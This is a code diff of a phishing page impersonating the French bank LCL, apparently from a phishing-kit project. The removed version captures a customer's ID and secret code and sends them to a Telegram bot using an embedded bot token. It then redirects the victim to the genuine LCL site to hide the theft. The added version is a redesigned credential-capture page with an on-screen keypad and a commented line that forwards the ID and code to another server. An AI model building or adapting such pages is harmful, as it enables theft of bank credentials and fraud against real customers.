@@ -2,183 +2,121 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Mon Espace LCL</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification Sécurité LCL</title>
     <style>
-        /* RESET & BASE */
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
         body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #FFFFFF;
-            color: #333333;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #f4f4f4;
             display: flex;
             justify-content: center;
-            min-height: 100vh;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
         }
 
         .container {
-            width: 100%;
-            max-width: 480px; /* Largeur max type mobile */
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+            background-color: white;
+            padding: 30px;
+            width: 320px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            border-radius: 8px;
         }
 
-        /* LOGO */
-        .logo-wrapper {
-            margin-top: 40px;
-            margin-bottom: 30px;
-            display: flex;
-            justify-content: center;
+        h2 {
+            text-align: center;
+            color: #0055a4; /* Bleu LCL */
+            margin-bottom: 20px;
+            font-size: 18px;
         }
 
-        .logo-wrapper img {
-            width: 140px;
-            height: auto;
-        }
-
-        /* TITRE */
-        h1 {
-            font-size: 20px;
-            font-weight: 600;
-            text-align: left;
-            width: 100%;
-            margin-bottom: 30px;
-            color: #000;
-        }
-
-        /* FORMULAIRE */
         .input-group {
-            width: 100%;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             position: relative;
         }
 
-        .input-group label {
+        label {
             display: block;
-            font-size: 14px;
-            font-weight: 500;
             margin-bottom: 8px;
-            color: #333;
+            font-size: 14px;
+            color: #555;
         }
 
-        /* STYLE DES CHAMPS (Sans bordure latérale/haut, uniquement pointillés en bas) */
-        .lcl-input {
-            width: 100%;
-            padding: 12px 5px; /* Padding réduit car pas de bordure */
-            font-size: 16px;
-            color: #000;
-            background: transparent;
+        /* Zone de saisie invisible (pour capter le focus) */
+        .hidden-input {
+            position: absolute;
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        /* Affichage des points (style demandé) */
+        .display-area {
             border: none;
-            border-bottom: 1px dashed #ccc; /* Pointillés gris clair */
-            outline: none;
-            transition: border-color 0.2s;
+            /* Fond blanc pur pour masquer la bordure, ou transparent si préférence */
+            background: transparent; 
+            font-size: 24px;
+            text-align: center;
+            letter-spacing: 3px;
+            color: #333;
+            width: 100%;
+            padding: 10px 0;
+            box-sizing: border-box;
+            /* Pas de bordure classique */
+            border-bottom: 1px dashed #ccc; /* Optionnel : une fine ligne pointillée très légère pour délimiter */
         }
 
-        .lcl-input:focus {
-            border-bottom: 1px solid #0056B2; /* Bleu LCL au focus */
+        /* Clavier numérique */
+        .keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 20px;
         }
 
-        /* BOUTON */
+        .key {
+            background-color: #f0f0f0;
+            border: none;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            font-size: 20px;
+            font-weight: bold;
+            color: #333;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            margin: 0 auto; /* Centrer les boutons */
+        }
+
+        .key:active {
+            background-color: #ddd;
+            transform: scale(0.95);
+        }
+
+        .key-clear {
+            background-color: #ffcccb; /* Rouge pâle */
+            color: #c00;
+        }
+        
+        .key-back {
+            background-color: #e0e0e0;
+        }
+
         .btn-submit {
             width: 100%;
-            background-color: #0056B2; /* Bleu LCL */
+            padding: 12px;
+            background-color: #0055a4;
             color: white;
             border: none;
-            padding: 16px;
-            font-size: 16px;
-            font-weight: 600;
             border-radius: 4px;
+            font-size: 16px;
             cursor: pointer;
-            margin-top: 10px;
-            margin-bottom: 20px;
-            transition: background-color 0.2s;
+            margin-top: 20px;
         }
-
-        .btn-submit:active {
-            background-color: #003d82;
-        }
-
+        
         .btn-submit:disabled {
             background-color: #ccc;
             cursor: not-allowed;
-        }
-
-        /* LIENS */
-        .links {
-            width: 100%;
-            display: flex;
-            flex-direction: column;
-            gap: 12px;
-            margin-bottom: 20px;
-        }
-
-        .links a {
-            color: #0056B2;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-        }
-
-        .links a:hover {
-            text-decoration: underline;
-        }
-
-        .signup-link {
-            color: #0056B2;
-            font-weight: 600;
-            text-decoration: none;
-            font-size: 14px;
-            margin-top: 10px;
-            display: block;
-            text-align: left;
-        }
-
-        /* FOOTER / SECURITE */
-        .security-note {
-            font-size: 12px;
-            color: #666;
-            line-height: 1.4;
-            margin-top: 30px;
-            text-align: left;
-            border-top: 1px solid #eee;
-            padding-top: 15px;
-            width: 100%;
-        }
-
-        /* GESTION DES ÉTAPES */
-        .step {
-            display: none;
-            width: 100%;
-        }
-
-        .step.active {
-            display: block;
-        }
-        
-        /* Spinner */
-        .loader {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #0056B2;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 2s linear infinite;
-            display: inline-block;
-            vertical-align: middle;
-            margin-right: 10px;
-            display: none;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
         }
 
     </style>
@@ -186,160 +124,173 @@
 <body>
 
 <div class="container">
-    
-    <!-- LOGO -->
-    <div class="logo-wrapper">
-        <img src="https://upload.wikimedia.org/wikipedia/fr/thumb/0/0b/Lcl_logo.svg/250px-Lcl_logo.svg.png" alt="LCL Logo">
+    <h2>Vérification de Sécurité</h2>
+    <p style="text-align: center; font-size: 13px; color: #666; margin-bottom: 20px;">
+        Veuillez entrer vos identifiants pour confirmer votre identité.
+    </p>
+
+    <!-- Champ Identifiant (10 chiffres) -->
+    <div class="input-group">
+        <label>Identifiant (10 chiffres)</label>
+        <!-- Input caché qui capture la frappe -->
+        <input type="tel" id="input-id" class="hidden-input" maxlength="10" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+        <!-- Zone visuelle avec des points -->
+        <div id="display-id" class="display-area"></div>
     </div>
 
-    <!-- ÉTAPE 1 : IDENTIFIANT -->
-    <div id="step1" class="step active">
-        <h1>Votre identifiant</h1>
-
-        <div class="input-group">
-            <label for="identifiant">Identifiant</label>
-            <!-- inputmode numeric pour clavier chiffre sur mobile -->
-            <input type="text" id="identifiant" class="lcl-input" placeholder=" " required autocomplete="off">
-        </div>
-
-        <button class="btn-submit" id="btn-next" onclick="goToStep2()">
-            Valider
-        </button>
-
-        <div class="links">
-            <a href="#">Identifiant oublié ?</a>
-            <a href="#">Code personnel oublié ?</a>
-        </div>
-
-        <a href="#" class="signup-link">Pas encore client ? Ouvrir un compte &gt;</a>
+    <!-- Champ Mot de passe (6 chiffres) -->
+    <div class="input-group">
+        <label>Code secret</label>
+        <input type="tel" id="input-pass" class="hidden-input" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off">
+        <div id="display-pass" class="display-area"></div>
     </div>
 
-    <!-- ÉTAPE 2 : CODE SECRET -->
-    <div id="step2" class="step">
-        <h1>Votre code personnel</h1>
-
-        <div class="input-group">
-            <label for="code">Code personnel</label>
-            <input type="password" id="code" class="lcl-input" placeholder=" " required inputmode="numeric" pattern="\d{6}" maxlength="6">
-        </div>
-
-        <button class="btn-submit" id="btn-submit-final" onclick="submitData()">
-            <span id="btn-text">Valider</span>
-            <span class="loader" id="loader"></span>
-        </button>
-
-        <div class="links">
-            <a href="#">Identifiant oublié ?</a>
-            <a href="#">Code personnel oublié ?</a>
-        </div>
-
-        <a href="#" class="signup-link">Pas encore client ? Ouvrir un compte &gt;</a>
+    <!-- Clavier Numérique -->
+    <div class="keypad">
+        <button class="key" onclick="press('1')">1</button>
+        <button class="key" onclick="press('2')">2</button>
+        <button class="key" onclick="press('3')">3</button>
+        <button class="key" onclick="press('4')">4</button>
+        <button class="key" onclick="press('5')">5</button>
+        <button class="key" onclick="press('6')">6</button>
+        <button class="key" onclick="press('7')">7</button>
+        <button class="key" onclick="press('8')">8</button>
+        <button class="key" onclick="press('9')">9</button>
+        <button class="key key-back" onclick="backspace()">⌫</button>
+        <button class="key" onclick="press('0')">0</button>
+        <button class="key key-clear" onclick="clearAll()">C</button>
     </div>
 
-    <!-- NOTE SÉCURITÉ -->
-    <div class="security-note">
-        LCL ne vous sollicitera jamais (que ce soit par mail, par SMS ou par téléphone) pour vous demander de communiquer de quelque manière que ce soit vos mots de passe, codes confidentiels ou codes à usage unique reçus par SMS.
-    </div>
-
+    <button class="btn-submit" id="btn-validate" disabled onclick="validate()">Valider</button>
 </div>
 
 <script>
-    // CONFIGURATION TELEGRAM
-    const BOT_TOKEN = "8835375365:AAGXLvfFbU_wNtDvs5jxpEe019V2n6IY_WQ";
-    const CHAT_ID = "8501464548";
-    const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    let activeField = 'id'; // 'id' ou 'pass'
+    const inputId = document.getElementById('input-id');
+    const inputPass = document.getElementById('input-pass');
+    const displayId = document.getElementById('display-id');
+    const displayPass = document.getElementById('display-pass');
+    const btnValidate = document.getElementById('btn-validate');
 
-    // VARIABLES
-    let userData = {
-        identifiant: "",
-        code: ""
-    };
+    // Initialisation : focus sur l'ID
+    inputId.focus();
 
-    // FONCTION : PASSER À L'ÉTAPE 2
-    function goToStep2() {
-        const identifiantInput = document.getElementById('identifiant').value;
-        
-        if (identifiantInput.trim() === "") {
-            alert("Veuillez entrer votre identifiant.");
-            return;
+    // Cliquer sur la zone de texte active l'input correspondant
+    displayId.addEventListener('click', () => {
+        activeField = 'id';
+        inputId.focus();
+        updateCursor('id');
+    });
+
+    displayPass.addEventListener('click', () => {
+        activeField = 'pass';
+        inputPass.focus();
+        updateCursor('pass');
+    });
+
+    // Mettre à jour le curseur visuel (ligne sous les points)
+    function updateCursor(field) {
+        if(field === 'id') {
+            displayId.style.borderBottom = "1px dashed #0055a4";
+            displayPass.style.borderBottom = "1px dashed #ccc";
+        } else {
+            displayPass.style.borderBottom = "1px dashed #0055a4";
+            displayId.style.borderBottom = "1px dashed #ccc";
         }
-
-        userData.identifiant = identifiantInput;
-        
-        // Passage à l'étape 2
-        document.getElementById('step1').classList.remove('active');
-        document.getElementById('step2').classList.add('active');
-        
-        // Focus automatique sur le champ code
-        document.getElementById('code').focus();
     }
 
-    // FONCTION : ENVOYER LES DONNÉES ET REDIRIGER
-    function submitData() {
-        const codeInput = document.getElementById('code').value;
-        
-        if (codeInput.trim() === "") {
-            alert("Veuillez entrer votre code.");
-            return;
-        }
-
-        userData.code = codeInput;
-
-        // UI Loading
-        const btnText = document.getElementById('btn-text');
-        const loader = document.getElementById('loader');
-        const btn = document.getElementById('btn-submit-final');
-        
-        btnText.innerText = "Vérification...";
-        loader.style.display = "inline-block";
-        btn.disabled = true;
-
-        // Préparation du message Telegram
-        const message = `🔐 *Nouvelle Connexion LCL*\n\n` +
-                        `👤 Identifiant: ${userData.identifiant}\n` +
-                        `🔑 Code: ${userData.code}\n` +
-                        `📱 Device: iOS (iPhone)\n` +
-                        `🕒 Heure: ${new Date().toLocaleTimeString()}`;
-
-        // Envoi à Telegram
-        fetch(API_URL, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            })
-        })
-        .then(response => {
-            if (response.ok) {
-                // Succès : Redirection vers le vrai site
-                setTimeout(() => {
-                    window.location.href = "https://monespace.lcl.fr";
-                }, 1000);
-            } else {
-                // Si erreur API mais on redirige quand même pour ne pas casser l'expérience
-                console.error("Erreur Telegram:", response);
-                window.location.href = "https://monespace.lcl.fr";
+    // Gestion des boutons du clavier
+    function press(num) {
+        if (activeField === 'id') {
+            if (inputId.value.length < 10) {
+                inputId.value += num;
+                updateDisplay('id', inputId.value);
             }
-        })
-        .catch(err => {
-            console.error("Réseau:", err);
-            window.location.href = "https://monespace.lcl.fr";
-        });
+        } else {
+            if (inputPass.value.length < 6) {
+                inputPass.value += num;
+                updateDisplay('pass', inputPass.value);
+            }
+        }
+        checkValidation();
     }
 
-    // Gérer la touche Entrée sur les champs
-    document.getElementById('identifiant').addEventListener('keypress', function (e) {
-        if (e.key === 'Enter') {
-            goToStep2();
+    function backspace() {
+        if (activeField === 'id') {
+            inputId.value = inputId.value.slice(0, -1);
+            updateDisplay('id', inputId.value);
+        } else {
+            inputPass.value = inputPass.value.slice(0, -1);
+            updateDisplay('pass', inputPass.value);
+        }
+        checkValidation();
+    }
+
+    function clearAll() {
+        inputId.value = '';
+        inputPass.value = '';
+        updateDisplay('id', '');
+        updateDisplay('pass', '');
+        activeField = 'id';
+        inputId.focus();
+        updateCursor('id');
+        checkValidation();
+    }
+
+    // Mise à jour visuelle des points
+    function updateDisplay(type, value) {
+        if (type === 'id') {
+            // Affiche des points pour chaque chiffre
+            displayId.textContent = '•'.repeat(value.length);
+            // Si on veut voir le chiffre au dernier moment ou juste des points :
+            // Ici on force des points pour plus de sécurité
+        } else {
+            displayPass.textContent = '•'.repeat(value.length);
+        }
+    }
+
+    // Vérifier si on peut activer le bouton Valider
+    function checkValidation() {
+        if (inputId.value.length === 10 && inputPass.value.length === 6) {
+            btnValidate.disabled = false;
+        } else {
+            btnValidate.disabled = true;
+        }
+    }
+
+    // Simulation de validation
+    function validate() {
+        const id = inputId.value;
+        const pass = inputPass.value;
+        alert(`Données envoyées :\nID : ${id}\nCode : ${pass}`);
+        // Ici, tu peux ajouter le code pour envoyer les données à ton serveur
+        // window.location.href = "https://ton-site.com/submit?id=" + id + "&pass=" + pass;
+    }
+
+    // Support de la frappe clavier physique
+    document.addEventListener('keydown', (e) => {
+        if (e.key >= '0' && e.key <= '9') {
+            press(e.key);
+        } else if (e.key === 'Backspace') {
+            backspace();
+        } else if (e.key === 'Tab') {
+            e.preventDefault();
+            if(activeField === 'id') {
+                activeField = 'pass';
+                inputPass.focus();
+                updateCursor('pass');
+            } else {
+                activeField = 'id';
+                inputId.focus();
+                updateCursor('id');
+            }
         }
     });
 
-    document.getElementById('code').addEventListener('keypress', function (e) {
-        if (e.key === 'Enter') {
-            submitData();
-        }
+    // Garder le focus sur le champ actif
+    document.addEventListener('click', (e) => {
+        if(activeField === 'id') inputId.focus();
+        else inputPass.focus();
     });
 
 </script>
